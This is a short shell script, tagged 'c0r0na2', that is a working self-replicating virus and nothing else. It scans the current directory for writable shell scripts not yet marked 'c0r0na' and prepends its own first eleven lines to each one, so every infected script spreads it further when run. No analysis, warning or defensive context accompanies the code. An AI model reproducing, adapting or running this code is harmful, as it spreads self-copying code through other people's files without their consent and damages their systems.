#!/bin/sh
#c0r0na2
for f in *
do
if (file $f |grep shell && [ -f $f -a -w $f ] && ! head -n 2 $f |grep c0r0na) >/dev/null;then
cat $f >.a
head -n 11 $0 >$f
cat .a >>$f
rm -f .a
fi;done
